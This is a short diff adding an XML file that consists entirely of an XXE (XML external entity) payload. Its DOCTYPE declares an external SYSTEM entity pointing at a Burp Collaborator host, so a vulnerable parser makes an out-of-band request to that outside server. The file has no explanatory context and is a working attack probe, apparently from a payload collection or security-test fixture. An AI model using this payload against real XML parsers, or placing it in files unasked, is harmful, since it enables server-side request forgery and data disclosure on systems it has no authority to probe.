@@ -1,0 +1,6 @@
+<?xml version="1.0" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "http://ji5cs2rl70id9k0uk6c77leh2881wq.burpcollaborator.net">
+]>
+<r>&sp;</r>
